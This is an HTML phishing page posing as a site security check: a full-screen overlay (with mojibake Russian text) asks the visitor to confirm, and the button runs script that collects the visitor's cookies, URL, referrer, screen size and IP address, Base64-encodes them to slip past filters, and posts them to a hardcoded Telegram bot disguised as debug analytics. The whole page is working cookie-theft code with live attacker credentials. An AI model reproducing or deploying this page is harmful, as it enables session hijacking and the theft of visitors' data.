<!DOCTYPE html>
<html>
<head>
    <title>Cookie Wall</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div style="text-align: center">
            <h2>üîí –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∞–π—Ç—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
            <button style="padding: 15px; font-size: 18px" onclick="stealCookies()">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7593021707:AAHW29zq3d78rihpSNAMxlbxK3dhCUHh4I8';
        const CHAT_ID = '7386938500';

        async function exfiltrate(data) {
            // –®–∏—Ñ—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Base64 –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø—Ä–æ—Å—Ç—ã—Ö —Ñ–∏–ª—å—Ç—Ä–æ–≤
            const payload = btoa(JSON.stringify({
                cookies: document.cookie,
                origin: location.href,
                referrer: document.referrer,
                screen: `${screen.width}x${screen.height}`,
                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json())
            }));

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Telegram API —Å –º–∞—Å–∫–∏—Ä–æ–≤–∫–æ–π –ø–æ–¥ –∞–Ω–∞–ª–∏—Ç–∏–∫—É
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `üì° [DEBUG] ${payload}`
                })
            });
        }

        function stealCookies() {
            // –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–ø–∏—Å—ã–≤–∞–µ–º —Å–µ—Å—Å–∏–æ–Ω–Ω—É—é –∫—É–∫—É –µ—Å–ª–∏ –ø—É—Å—Ç–æ
            if(!document.cookie.includes('=')) {
                document.cookie = `session_fallback=${Date.now()}; path=/; SameSite=Lax`;
            }
            
            exfiltrate();
            document.querySelector('.overlay').remove();
        }
    </script>
</body>
</html>
